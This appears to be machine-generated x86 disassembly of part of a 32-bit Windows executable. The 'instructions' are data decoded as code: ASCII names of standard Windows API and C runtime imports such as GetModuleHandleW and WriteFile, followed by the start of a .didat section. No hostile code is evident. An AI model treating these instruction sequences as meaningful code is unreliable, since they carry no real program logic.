  40e7b9:	add    al,0x53
  40e7bb:	gs je  0x40e803
  40e7be:	jbe    0x40e825
  40e7c0:	outs   dx,BYTE PTR ds:[esi]
  40e7c1:	je     0x40e7c3
  40e7c3:	add    bh,bh
  40e7c5:	add    ecx,DWORD PTR [edi+0x75]
  40e7c8:	je     0x40e83a
  40e7ca:	jne    0x40e840
  40e7cc:	inc    esp
  40e7cd:	bound  esi,QWORD PTR gs:[ebp+0x67]
  40e7d1:	push   ebx
  40e7d2:	je     0x40e846
  40e7d4:	imul   ebp,DWORD PTR [esi+0x67],0x68000057
  40e7db:	add    al,BYTE PTR [edi+0x65]
  40e7de:	je     0x40e82d
  40e7e0:	outs   dx,DWORD PTR ds:[esi]
  40e7e1:	fs jne 0x40e850
  40e7e4:	gs dec eax
  40e7e6:	popa   
  40e7e7:	outs   dx,BYTE PTR ds:[esi]
  40e7e8:	fs ins BYTE PTR es:[edi],dx
  40e7ea:	gs push edi
  40e7ec:	add    BYTE PTR [eax],al
  40e7ee:	push   cs
  40e7ef:	add    al,BYTE PTR [edi+0x65]
  40e7f2:	je     0x40e837
  40e7f4:	jne    0x40e868
  40e7f6:	jb     0x40e85d
  40e7f8:	outs   dx,BYTE PTR ds:[esi]
  40e7f9:	je     0x40e84f
  40e7fb:	push   0x64616572
  40e800:	add    BYTE PTR [eax],al
  40e802:	icebp  
  40e803:	add    eax,0x74697257
  40e808:	gs inc esi
  40e80a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6e49034b
  40e812:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40e81a:	inc    ebx
  40e81b:	jb     0x40e886
  40e81d:	je     0x40e888
  40e81f:	arpl   WORD PTR [ecx+0x6c],sp
  40e822:	push   ebx
  40e823:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40e828:	outs   dx,BYTE PTR ds:[esi]
  40e829:	add    bl,dh
  40e82b:	add    ecx,DWORD PTR [edi+0x70]
  40e82e:	outs   dx,BYTE PTR gs:[esi]
  40e830:	push   eax
  40e831:	jb     0x40e8a2
  40e833:	arpl   WORD PTR [ebp+0x73],sp
  40e836:	jae    0x40e838
  40e838:	sbb    eax,DWORD PTR [ebx]
  40e83a:	inc    edi
  40e83b:	ins    BYTE PTR es:[edi],dx
  40e83c:	outs   dx,DWORD PTR ds:[esi]
  40e83d:	bound  esp,QWORD PTR [ecx+0x6c]
  40e840:	inc    ecx
  40e841:	ins    BYTE PTR es:[edi],dx
  40e842:	ins    BYTE PTR es:[edi],dx
  40e843:	outs   dx,DWORD PTR ds:[esi]
  40e844:	arpl   WORD PTR [eax],ax
  40e846:	fld    QWORD PTR ds:0x65646957
  40e84c:	inc    ebx
  40e84d:	push   0x6f547261
  40e852:	dec    ebp
  40e853:	jne    0x40e8c1
  40e855:	je     0x40e8c0
  40e857:	inc    edx
  40e858:	jns    0x40e8ce
  40e85a:	add    BYTE PTR gs:[ebx+eax*1+0x64616f4c],ch
  40e862:	dec    esp
  40e863:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  40e86a:	add    BYTE PTR [eax],al
  40e86c:	push   ebp
  40e86d:	add    al,BYTE PTR [edi+0x65]
  40e870:	je     0x40e8be
  40e872:	outs   dx,DWORD PTR ds:[esi]
  40e873:	arpl   WORD PTR [ecx+0x6c],sp
  40e876:	gs dec ecx
  40e878:	outs   dx,BYTE PTR ds:[esi]
  40e879:	outs   dx,WORD PTR ds:[esi]
  40e87b:	push   edi
  40e87c:	add    BYTE PTR [eax],al
  40e87e:	pop    edi
  40e87f:	add    eax,0x65656c53
  40e884:	jo     0x40e886
  40e886:	es add eax,0x50746553
  40e88c:	jb     0x40e8fd
  40e88e:	arpl   WORD PTR [ebp+0x73],sp
  40e891:	jae    0x40e8e0
  40e893:	imul   esi,DWORD PTR [ecx+ebp*2+0x67],0x6f697461
  40e89b:	outs   dx,BYTE PTR ds:[esi]
  40e89c:	push   eax
  40e89d:	outs   dx,DWORD PTR ds:[esi]
  40e89e:	ins    BYTE PTR es:[edi],dx
  40e89f:	imul   esp,DWORD PTR [ebx+0x79],0x19a0000
  40e8a6:	inc    esi
  40e8a7:	outs   dx,DWORD PTR ds:[esi]
  40e8a8:	jb     0x40e917
  40e8aa:	popa   
  40e8ab:	je     0x40e8fa
  40e8ad:	gs jae 0x40e923
  40e8b0:	popa   
  40e8b1:	addr16 gs push edi
  40e8b4:	add    BYTE PTR [eax],al
  40e8b6:	or     DWORD PTR [ebx],eax
  40e8b8:	inc    edi
  40e8b9:	gs je  0x40e912
  40e8bc:	gs jb  0x40e932
  40e8bf:	imul   ebp,DWORD PTR [edi+0x6e],0x577845
  40e8c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8c7:	add    ecx,DWORD PTR [ebp+eiz*2+0x61]
  40e8cb:	jbe    0x40e932
  40e8cd:	inc    ebx
  40e8ce:	jb     0x40e939
  40e8d0:	je     0x40e93b
  40e8d2:	arpl   WORD PTR [ecx+0x6c],sp
  40e8d5:	push   ebx
  40e8d6:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40e8db:	outs   dx,BYTE PTR ds:[esi]
  40e8dc:	add    BYTE PTR [eax],al
  40e8de:	add    al,BYTE PTR fs:[edi+0x65]
  40e8e2:	je     0x40e931
  40e8e4:	outs   dx,DWORD PTR ds:[esi]
  40e8e5:	fs jne 0x40e954
  40e8e8:	gs inc esi
  40e8ea:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  40e8f2:	add    BYTE PTR [eax],al
  40e8f4:	xchg   ecx,eax
  40e8f5:	add    BYTE PTR [ebx+0x6f],al
  40e8f8:	ins    DWORD PTR es:[edi],dx
  40e8f9:	jo     0x40e95c
  40e8fb:	jb     0x40e962
  40e8fd:	push   ebx
  40e8fe:	je     0x40e972
  40e900:	imul   ebp,DWORD PTR [esi+0x67],0xa5000057
  40e907:	add    DWORD PTR [edi+0x65],eax
  40e90a:	je     0x40e94d
  40e90c:	inc    ebx
  40e90d:	push   eax
  40e90e:	add    BYTE PTR [eax],al
  40e910:	clts   
  40e912:	ins    BYTE PTR es:[edi],dx
  40e913:	jae    0x40e989
  40e915:	jb     0x40e97a
  40e917:	ins    DWORD PTR es:[edi],dx
  40e918:	jo     0x40e971
  40e91a:	add    BYTE PTR [eax],al
  40e91c:	aad    0x3
  40e91e:	dec    ebp
  40e91f:	jne    0x40e98d
  40e921:	je     0x40e98c
  40e923:	inc    edx
  40e924:	jns    0x40e99a
  40e926:	gs push esp
  40e928:	outs   dx,DWORD PTR ds:[esi]
  40e929:	push   edi
  40e92a:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x726168
  40e932:	sbb    eax,DWORD PTR [esi]
  40e934:	ins    BYTE PTR es:[edi],dx
  40e935:	jae    0x40e9ab
  40e937:	jb     0x40e9a5
  40e939:	outs   dx,BYTE PTR gs:[esi]
  40e93b:	push   edi
  40e93c:	add    BYTE PTR [eax],al
  40e93e:	ret    0x4702
  40e941:	gs je  0x40e997
  40e944:	je     0x40e9aa
  40e946:	dec    eax
  40e947:	popa   
  40e948:	outs   dx,BYTE PTR ds:[esi]
  40e949:	fs ins BYTE PTR es:[edi],dx
  40e94b:	add    BYTE PTR gs:[eax],al
  40e94e:	push   ecx
  40e94f:	add    al,BYTE PTR [edi+0x65]
  40e952:	je     0x40e9a0
  40e954:	popa   
  40e955:	jae    0x40e9cb
  40e957:	inc    ebp
  40e958:	jb     0x40e9cc
  40e95a:	outs   dx,DWORD PTR ds:[esi]
  40e95b:	jb     0x40e95d
  40e95d:	add    BYTE PTR [esi],dl
  40e95f:	add    eax,0x4c746553
  40e964:	popa   
  40e965:	jae    0x40e9db
  40e967:	inc    ebp
  40e968:	jb     0x40e9dc
  40e96a:	outs   dx,DWORD PTR ds:[esi]
  40e96b:	jb     0x40e96d
  40e96d:	add    BYTE PTR [esi+0x74654702],bl
  40e973:	push   eax
  40e974:	jb     0x40e9e5
  40e976:	arpl   WORD PTR [ecx+0x64],ax
  40e979:	fs jb  0x40e9e1
  40e97c:	jae    0x40e9f1
  40e97e:	add    BYTE PTR [eax],al
  40e980:	and    eax,0x746e4501
  40e985:	gs jb  0x40e9cb
  40e988:	jb     0x40e9f3
  40e98a:	je     0x40e9f5
  40e98c:	arpl   WORD PTR [ecx+0x6c],sp
  40e98f:	push   ebx
  40e990:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40e995:	outs   dx,BYTE PTR ds:[esi]
  40e996:	add    BYTE PTR [eax],al
  40e998:	and    al,BYTE PTR [ebx]
  40e99a:	inc    edi
  40e99b:	ins    BYTE PTR es:[edi],dx
  40e99c:	outs   dx,DWORD PTR ds:[esi]
  40e99d:	bound  esp,QWORD PTR [ecx+0x6c]
  40e9a0:	inc    esi
  40e9a1:	jb     0x40ea08
  40e9a3:	add    BYTE PTR gs:[eax],al
  40e9a6:	pop    DWORD PTR ds:0x61686e55
  40e9ac:	outs   dx,BYTE PTR ds:[esi]
  40e9ad:	fs ins BYTE PTR es:[edi],dx
  40e9af:	gs fs inc ebp
  40e9b2:	js     0x40ea17
  40e9b4:	gs jo  0x40ea2b
  40e9b7:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  40e9be:	gs jb  0x40e9c1
  40e9c1:	add    BYTE PTR [edi],bh
  40e9c3:	add    al,BYTE PTR [edi+0x65]
  40e9c6:	je     0x40ea0e
  40e9c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  40e9d0:	mov    ah,0x0
  40e9d2:	inc    ebx
  40e9d3:	jb     0x40ea3a
  40e9d5:	popa   
  40e9d6:	je     0x40ea3d
  40e9d8:	inc    ebp
  40e9d9:	jbe    0x40ea40
  40e9db:	outs   dx,BYTE PTR ds:[esi]
  40e9dc:	je     0x40ea35
  40e9de:	add    BYTE PTR [eax],al
  40e9e0:	in     eax,dx
  40e9e1:	add    al,0x53
  40e9e3:	gs je  0x40ea29
  40e9e6:	jne    0x40ea5a
  40e9e8:	jb     0x40ea4f
  40e9ea:	outs   dx,BYTE PTR ds:[esi]
  40e9eb:	je     0x40ea31
  40e9ed:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40e9f4:	jns    0x40ea4d
  40e9f6:	add    BYTE PTR [eax],al
  40e9f8:	out    0x3,eax
  40e9fa:	dec    edi
  40e9fb:	jo     0x40ea62
  40e9fd:	outs   dx,BYTE PTR ds:[esi]
  40e9fe:	inc    ebp
  40e9ff:	jbe    0x40ea66
  40ea01:	outs   dx,BYTE PTR ds:[esi]
  40ea02:	je     0x40ea5b
  40ea04:	add    BYTE PTR [eax],al
  40ea06:	add    al,0x1
  40ea08:	inc    esp
  40ea09:	gs ins BYTE PTR es:[edi],dx
  40ea0b:	gs je  0x40ea73
  40ea0e:	inc    ebx
  40ea0f:	jb     0x40ea7a
  40ea11:	je     0x40ea7c
  40ea13:	arpl   WORD PTR [ecx+0x6c],sp
  40ea16:	push   ebx
  40ea17:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40ea1c:	outs   dx,BYTE PTR ds:[esi]
  40ea1d:	add    BYTE PTR [ebp+0x0],bh
  40ea20:	inc    ebx
  40ea21:	ins    BYTE PTR es:[edi],dx
  40ea22:	outs   dx,DWORD PTR ds:[esi]
  40ea23:	jae    0x40ea8a
  40ea25:	dec    eax
  40ea26:	popa   
  40ea27:	outs   dx,BYTE PTR ds:[esi]
  40ea28:	fs ins BYTE PTR es:[edi],dx
  40ea2a:	add    BYTE PTR gs:[edi],al
  40ea2d:	add    eax,DWORD PTR [edi+0x65]
  40ea30:	je     0x40ea88
  40ea32:	gs jb  0x40eaa8
  40ea35:	imul   ebp,DWORD PTR [edi+0x6e],0xe70000
  40ea3c:	inc    ebx
  40ea3d:	jb     0x40eaa4
  40ea3f:	popa   
  40ea40:	je     0x40eaa7
  40ea42:	push   esp
  40ea43:	push   0x64616572
  40ea48:	add    BYTE PTR [eax],al
  40ea4a:	rol    BYTE PTR [edx],1
  40ea4c:	inc    edi
  40ea4d:	gs je  0x40eaa3
  40ea50:	jns    0x40eac5
  40ea52:	je     0x40eab9
  40ea54:	ins    DWORD PTR es:[edi],dx
  40ea55:	inc    esp
  40ea56:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40ea5d:	jns    0x40eab6
  40ea5f:	add    BYTE PTR [ebx+0x45],cl
  40ea62:	push   edx
  40ea63:	dec    esi
  40ea64:	inc    ebp
  40ea65:	dec    esp
  40ea66:	xor    esi,DWORD PTR [edx]
  40ea68:	cs fs ins BYTE PTR es:[edi],dx
  40ea6b:	ins    BYTE PTR es:[edi],dx
  40ea6c:	add    BYTE PTR [eax],al
  40ea6e:	mov    dh,0x0
  40ea70:	inc    esp
  40ea71:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  40ea78:	dec    ebp
  40ea79:	gs jae 0x40eaef
  40ea7c:	popa   
  40ea7d:	addr16 gs push edi
  40ea80:	add    BYTE PTR [eax],al
  40ea82:	add    BYTE PTR [edx],0x50
  40ea85:	outs   dx,DWORD PTR ds:[esi]
  40ea86:	jae    0x40eafc
  40ea88:	push   esp
  40ea89:	push   0x64616572
  40ea8e:	dec    ebp
  40ea8f:	gs jae 0x40eb05
  40ea92:	popa   
  40ea93:	addr16 gs push edi
  40ea96:	add    BYTE PTR [eax],al
  40ea98:	jnp    0x40ea9c
  40ea9a:	push   eax
  40ea9b:	gs imul ecx,DWORD PTR gs:[ebp+0x65],0x73
  40eaa1:	jae    0x40eb04
  40eaa3:	addr16 gs push edi
  40eaa6:	add    BYTE PTR [eax],al
  40eaa8:	add    BYTE PTR [edx],al
  40eaaa:	dec    ecx
  40eaab:	jae    0x40eaf0
  40eaad:	push   0x6c417261
  40eab2:	jo     0x40eb1c
  40eab4:	popa   
  40eab5:	dec    esi
  40eab6:	jne    0x40eb25
  40eab8:	gs jb  0x40eb24
  40eabb:	arpl   WORD PTR [edi+0x0],dx
  40eabe:	arpl   WORD PTR [ebx],ax
  40eac0:	push   esp
  40eac1:	jb     0x40eb24
  40eac3:	outs   dx,BYTE PTR ds:[esi]
  40eac4:	jae    0x40eb32
  40eac6:	popa   
  40eac7:	je     0x40eb2e
  40eac9:	dec    ebp
  40eaca:	gs jae 0x40eb40
  40eacd:	popa   
  40eace:	add    BYTE PTR gs:[bx+si],al
  40ead2:	arpl   WORD PTR [edx],ax
  40ead4:	dec    ebp
  40ead5:	jae    0x40eb3e
  40ead7:	push   edi
  40ead8:	popa   
  40ead9:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  40eae1:	je     0x40eb4c
  40eae3:	jo     0x40eb51
  40eae5:	gs dec edi
  40eae7:	bound  ebp,QWORD PTR [edx+0x65]
  40eaea:	arpl   WORD PTR [ebx+esi*2+0x0],si
  40eaee:	add    BYTE PTR [edx],0x50
  40eaf1:	outs   dx,DWORD PTR ds:[esi]
  40eaf2:	jae    0x40eb68
  40eaf4:	push   ecx
  40eaf5:	jne    0x40eb60
  40eaf7:	je     0x40eb46
  40eaf9:	gs jae 0x40eb6f
  40eafc:	popa   
  40eafd:	add    BYTE PTR gs:[bp+0x1],dh
  40eb02:	inc    edi
  40eb03:	gs je  0x40eb53
  40eb06:	gs jae 0x40eb7c
  40eb09:	popa   
  40eb0a:	addr16 gs push edi
  40eb0d:	add    BYTE PTR [ebp+0x53],dl
  40eb10:	inc    ebp
  40eb11:	push   edx
  40eb12:	xor    esi,DWORD PTR [edx]
  40eb14:	cs fs ins BYTE PTR es:[edi],dx
  40eb17:	ins    BYTE PTR es:[edi],dx
  40eb18:	add    BYTE PTR [eax],al
  40eb1a:	or     eax,0x63775f04
  40eb1f:	jae    0x40eb8a
  40eb21:	arpl   WORD PTR [ebp+0x70],bp
  40eb24:	add    BYTE PTR [eax],al
  40eb26:	in     al,dx
  40eb27:	add    ebx,DWORD PTR [edi+0x76]
  40eb2a:	jae    0x40eb9a
  40eb2c:	ja     0x40eb9e
  40eb2e:	jb     0x40eb99
  40eb30:	outs   dx,BYTE PTR ds:[esi]
  40eb31:	je     0x40eb99
  40eb33:	add    dh,ah
  40eb35:	add    ebx,DWORD PTR [edi+0x76]
  40eb38:	jae    0x40eba8
  40eb3a:	jo     0x40ebae
  40eb3c:	imul   ebp,DWORD PTR [esi+0x74],0x6f000066
  40eb43:	add    BYTE PTR [edi+0x58],bl
  40eb46:	arpl   WORD PTR [eax+0x74],si
  40eb49:	inc    esi
  40eb4a:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0xc90072
  40eb52:	pop    edi
  40eb53:	pop    edi
  40eb54:	jo     0x40ebb5
  40eb56:	pop    edi
  40eb57:	arpl   WORD PTR [edi+0x6d],bp
  40eb5a:	ins    DWORD PTR es:[edi],dx
  40eb5b:	outs   dx,DWORD PTR ds:[esi]
  40eb5c:	fs add BYTE PTR gs:[eax],al
  40eb60:	adc    DWORD PTR [ecx],eax
  40eb62:	pop    edi
  40eb63:	popa   
  40eb64:	ins    DWORD PTR es:[edi],dx
  40eb65:	jae    0x40ebce
  40eb67:	pop    edi
  40eb68:	gs js  0x40ebd4
  40eb6b:	je     0x40eb6d
  40eb6d:	add    BYTE PTR [ecx+0x675f5f00],ah
  40eb73:	gs je  0x40ebe3
  40eb76:	popa   
  40eb77:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  40eb7e:	loop   0x40eb80
  40eb80:	pop    edi
  40eb81:	pop    edi
  40eb82:	jae    0x40ebe9
  40eb84:	je     0x40ebe5
  40eb86:	popa   
  40eb87:	jo     0x40ebf9
  40eb89:	pop    edi
  40eb8a:	je     0x40ec05
  40eb8c:	jo     0x40ebf3
  40eb8e:	add    BYTE PTR [eax],al
  40eb90:	scas   al,BYTE PTR es:[edi]
  40eb91:	add    al,0x65
  40eb93:	js     0x40ebfe
  40eb95:	je     0x40eb97
  40eb97:	add    BYTE PTR [ebx+0x1],dh
  40eb9a:	pop    edi
  40eb9b:	gs js  0x40ec07
  40eb9e:	je     0x40eba0
  40eba0:	and    al,0x1
  40eba2:	pop    edi
  40eba3:	arpl   WORD PTR [ebp+0x78],sp
  40eba6:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x5f5f00ce
  40ebae:	jo     0x40ec0f
  40ebb0:	pop    edi
  40ebb1:	ins    WORD PTR es:[edi],dx
  40ebb3:	outs   dx,DWORD PTR ds:[esi]
  40ebb4:	fs add BYTE PTR gs:[eax],al
  40ebb8:	pop    es
  40ebb9:	add    bl,BYTE PTR [edi+0x69]
  40ebbc:	jae    0x40ec2b
  40ebbe:	bound  esp,QWORD PTR [edx+0x6c]
  40ebc1:	gs popa 
  40ebc3:	add    BYTE PTR fs:[eax],al
  40ebc6:	in     al,0x0
  40ebc8:	pop    edi
  40ebc9:	pop    edi
  40ebca:	jae    0x40ec31
  40ebcc:	je     0x40ec43
  40ebce:	jae    0x40ec35
  40ebd0:	jb     0x40ec3f
  40ebd2:	popa   
  40ebd3:	je     0x40ec3d
  40ebd5:	gs jb  0x40ec4a
  40ebd8:	add    BYTE PTR [eax],al
  40ebda:	call   0x6eaa4ae0
  40ebdf:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xf7006d72
  40ebe7:	add    BYTE PTR [edi+0x61],bl
  40ebea:	arpl   WORD PTR [ebp+0x64],bp
  40ebed:	ins    BYTE PTR es:[edi],dx
  40ebee:	outs   dx,BYTE PTR ds:[esi]
  40ebef:	add    BYTE PTR [ebp+0x73],ch
  40ebf2:	jbe    0x40ec57
  40ebf4:	jb     0x40ec6a
  40ebf6:	cs fs ins BYTE PTR es:[edi],dx
  40ebf9:	ins    BYTE PTR es:[edi],dx
  40ebfa:	add    BYTE PTR [eax],al
  40ebfc:	pusha  
  40ebfd:	add    bl,BYTE PTR [edi+0x6c]
  40ec00:	outs   dx,DWORD PTR ds:[esi]
  40ec01:	arpl   WORD PTR [ebx+0x0],bp
  40ec04:	les    eax,FWORD PTR [ebx]
  40ec06:	pop    edi
  40ec07:	jne    0x40ec77
  40ec09:	ins    BYTE PTR es:[edi],dx
  40ec0a:	outs   dx,DWORD PTR ds:[esi]
  40ec0b:	arpl   WORD PTR [ebx+0x0],bp
  40ec0e:	popf   
  40ec0f:	add    BYTE PTR [edi+0x5f],bl
  40ec12:	fs ins BYTE PTR es:[edi],dx
  40ec14:	ins    BYTE PTR es:[edi],dx
  40ec15:	outs   dx,DWORD PTR ds:[esi]
  40ec16:	outs   dx,BYTE PTR ds:[esi]
  40ec17:	gs js  0x40ec83
  40ec1a:	je     0x40ec1c
  40ec1c:	or     DWORD PTR [ebx],eax
  40ec1e:	pop    edi
  40ec1f:	outs   dx,DWORD PTR ds:[esi]
  40ec20:	outs   dx,BYTE PTR ds:[esi]
  40ec21:	gs js  0x40ec8d
  40ec24:	je     0x40ec26
  40ec26:	or     DWORD PTR ds:0x636d656d,eax
  40ec2c:	jo     0x40eca7
  40ec2e:	add    BYTE PTR [eax],al
  40ec30:	or     eax,0x6d656d05
  40ec35:	jae    0x40ec9c
  40ec37:	je     0x40ec39
  40ec39:	add    BYTE PTR ds:0x65743f00,dh
  40ec3f:	jb     0x40ecae
  40ec41:	imul   ebp,DWORD PTR [esi+0x61],0x40406574
  40ec48:	pop    ecx
  40ec49:	inc    ecx
  40ec4a:	pop    eax
  40ec4b:	pop    eax
  40ec4c:	pop    edx
  40ec4d:	add    BYTE PTR [edi],dh
  40ec4f:	add    DWORD PTR [edi+0x63],ebx
  40ec52:	outs   dx,DWORD PTR ds:[esi]
  40ec53:	outs   dx,BYTE PTR ds:[esi]
  40ec54:	je     0x40ecc8
  40ec56:	outs   dx,DWORD PTR ds:[esi]
  40ec57:	ins    BYTE PTR es:[edi],dx
  40ec58:	data16 jo 0x40ec5b
  40ec5b:	add    BYTE PTR [edx+0x51744e01],bh
  40ec61:	jne    0x40ecc8
  40ec63:	jb     0x40ecde
  40ec65:	dec    ecx
  40ec66:	outs   dx,BYTE PTR ds:[esi]
  40ec67:	outs   dx,WORD PTR ds:[esi]
  40ec69:	jb     0x40ecd8
  40ec6b:	popa   
  40ec6c:	je     0x40ecd7
  40ec6e:	outs   dx,DWORD PTR ds:[esi]
  40ec6f:	outs   dx,BYTE PTR ds:[esi]
  40ec70:	push   eax
  40ec71:	jb     0x40ece2
  40ec73:	arpl   WORD PTR [ebp+0x73],sp
  40ec76:	jae    0x40ec78
  40ec78:	ins    BYTE PTR es:[edi],dx
  40ec79:	add    eax,0x556c7452
  40ec7e:	outs   dx,BYTE PTR ds:[esi]
  40ec7f:	ja     0x40ecea
  40ec81:	outs   dx,BYTE PTR ds:[esi]
  40ec82:	add    BYTE PTR fs:[esi+0x74],ch
  40ec86:	fs ins BYTE PTR es:[edi],dx
  40ec88:	ins    BYTE PTR es:[edi],dx
  40ec89:	cs fs ins BYTE PTR es:[edi],dx
  40ec8c:	ins    BYTE PTR es:[edi],dx
  40ec8d:	add    BYTE PTR [ebp+0x556f4300],cl
  40ec93:	outs   dx,BYTE PTR ds:[esi]
  40ec94:	imul   ebp,DWORD PTR [esi+0x69],0x6c616974
  40ec9b:	imul   edi,DWORD PTR [edx+0x65],0x5d0000
  40eca2:	inc    ebx
  40eca3:	outs   dx,DWORD PTR ds:[esi]
  40eca4:	dec    ecx
  40eca5:	outs   dx,BYTE PTR ds:[esi]
  40eca6:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40ecae:	add    BYTE PTR [eax],al
  40ecb0:	rol    DWORD PTR [ecx],0x53
  40ecb3:	je     0x40ed1c
  40ecb5:	dec    edi
  40ecb6:	jo     0x40ed1d
  40ecb8:	outs   dx,BYTE PTR ds:[esi]
  40ecb9:	push   ebx
  40ecba:	je     0x40ed2b
  40ecbc:	jb     0x40ed1f
  40ecbe:	add    BYTE PTR gs:[bx+si],al
  40ecc2:	jg     0x40ecc4
  40ecc4:	inc    ebx
  40ecc5:	outs   dx,DWORD PTR ds:[esi]
  40ecc6:	push   edx
  40ecc7:	gs jbe 0x40ed39
  40ecca:	imul   esp,DWORD PTR [ebp+0x43],0x6c
  40ecce:	popa   
  40eccf:	jae    0x40ed44
  40ecd1:	dec    edi
  40ecd2:	bound  ebp,QWORD PTR [edx+0x65]
  40ecd5:	arpl   WORD PTR [eax+eax*1+0x73],si
  40ecd9:	add    BYTE PTR [ebx+0x6f],al
  40ecdc:	push   edx
  40ecdd:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  40ece6:	popa   
  40ece7:	jae    0x40ed5c
  40ece9:	dec    edi
  40ecea:	bound  ebp,QWORD PTR [edx+0x65]
  40eced:	arpl   WORD PTR [eax+eax*1+0x6f],si
  40ecf1:	ins    BYTE PTR es:[edi],dx
  40ecf2:	xor    esi,DWORD PTR gs:[edx]
  40ecf5:	cs fs ins BYTE PTR es:[edi],dx
  40ecf8:	ins    BYTE PTR es:[edi],dx
  40ecf9:	add    BYTE PTR [ebp+0x74654702],bh
  40ecff:	push   ebx
  40ed00:	je     0x40ed63
  40ed02:	jb     0x40ed78
  40ed04:	jne    0x40ed76
  40ed06:	dec    ecx
  40ed07:	outs   dx,BYTE PTR ds:[esi]
  40ed08:	outs   dx,WORD PTR ds:[esi]
  40ed0a:	inc    ecx
  40ed0b:	add    BYTE PTR [ebx+0x5],cl
  40ed0e:	push   ebx
  40ed0f:	gs je  0x40ed67
  40ed12:	outs   dx,BYTE PTR ds:[esi]
  40ed13:	push   0x6c646e61
  40ed18:	gs fs inc ebp
  40ed1b:	js     0x40ed80
  40ed1d:	gs jo  0x40ed94
  40ed20:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  40ed27:	gs jb  0x40ed2a
  40ed2a:	imul   eax,DWORD PTR ds:0x6d726554,0x74616e69
  40ed34:	gs push eax
  40ed36:	jb     0x40eda7
  40ed38:	arpl   WORD PTR [ebp+0x73],sp
  40ed3b:	jae    0x40ed3d
  40ed3d:	add    BYTE PTR [ebx+0x2],ah
  40ed40:	inc    edi
  40ed41:	gs je  0x40ed91
  40ed44:	outs   dx,DWORD PTR ds:[esi]
  40ed45:	fs jne 0x40edb4
  40ed48:	gs dec eax
  40ed4a:	popa   
  40ed4b:	outs   dx,BYTE PTR ds:[esi]
  40ed4c:	fs ins BYTE PTR es:[edi],dx
  40ed4e:	gs inc ecx
  40ed50:	add    BYTE PTR [eax],al
  40ed52:	das    
  40ed53:	add    al,0x51
  40ed55:	jne    0x40edbc
  40ed57:	jb     0x40edd2
  40ed59:	push   eax
  40ed5a:	gs jb  0x40edc3
  40ed5d:	outs   dx,DWORD PTR ds:[esi]
  40ed5e:	jb     0x40edcd
  40ed60:	popa   
  40ed61:	outs   dx,BYTE PTR ds:[esi]
  40ed62:	arpl   WORD PTR [ebp+0x43],sp
  40ed65:	outs   dx,DWORD PTR ds:[esi]
  40ed66:	jne    0x40edd6
  40ed68:	je     0x40edcf
  40ed6a:	jb     0x40ed6c
  40ed6c:	or     DWORD PTR [edx],eax
  40ed6e:	inc    edi
  40ed6f:	gs je  0x40edb5
  40ed72:	jne    0x40ede6
  40ed74:	jb     0x40eddb
  40ed76:	outs   dx,BYTE PTR ds:[esi]
  40ed77:	je     0x40edc9
  40ed79:	jb     0x40edea
  40ed7b:	arpl   WORD PTR [ebp+0x73],sp
  40ed7e:	jae    0x40edc9
  40ed80:	add    BYTE PTR fs:0x74654702,cl
  40ed87:	inc    ebx
  40ed88:	jne    0x40edfc
  40ed8a:	jb     0x40edf1
  40ed8c:	outs   dx,BYTE PTR ds:[esi]
  40ed8d:	je     0x40ede3
  40ed8f:	push   0x64616572
  40ed94:	dec    ecx
  40ed95:	add    BYTE PTR fs:[eax],al
  40ed98:	xlat   BYTE PTR ds:[ebx]
  40ed99:	add    al,BYTE PTR [edi+0x65]
  40ed9c:	je     0x40edf1
  40ed9e:	jns    0x40ee13
  40eda0:	je     0x40ee07
  40eda2:	ins    DWORD PTR es:[edi],dx
  40eda3:	push   esp
  40eda4:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  40edab:	ins    BYTE PTR es:[edi],dx
  40edac:	gs push esp
  40edae:	imul   ebp,DWORD PTR [ebp+0x65],0x4702f400
  40edb5:	gs je  0x40ee0c
  40edb8:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  40edbf:	je     0x40edc1
  40edc1:	add    BYTE PTR [edx+0x616f4c03],ch
  40edc7:	fs dec esp
  40edc9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  40edd0:	js     0x40ee13
  40edd2:	add    BYTE PTR [eax],al
  40edd4:	add    DWORD PTR [ecx],eax
  40edd6:	inc    esp
  40edd7:	gs ins BYTE PTR es:[edi],dx
  40edd9:	popa   
  40edda:	jns    0x40ee28
  40eddc:	outs   dx,DWORD PTR ds:[esi]
  40eddd:	popa   
  40edde:	fs inc esi
  40ede0:	popa   
  40ede1:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x6f6f4865
  40ede9:	imul   eax,DWORD PTR [eax],0x0

Disassembly of section .didat:

0040f000 <.didat>:
  40f000:	jo     0x40ef9e
  40f002:	inc    eax
  40f003:	add    BYTE PTR [eax-0x4fffbf64],ah
  40f009:	pushf  
  40f00a:	inc    eax
  40f00b:	add    al,al
  40f00d:	pushf  
  40f00e:	inc    eax
  40f00f:	add    al,dl
  40f011:	pushf  
  40f012:	inc    eax
  40f013:	add    al,ah
  40f015:	pushf  
  40f016:	inc    eax
  40f017:	add    al,dh
  40f019:	pushf  
  40f01a:	inc    eax
  40f01b:	add    BYTE PTR [eax],al
  40f01d:	popf   
  40f01e:	inc    eax
  40f01f:	add    BYTE PTR [eax],dl
  40f021:	popf   
  40f022:	inc    eax
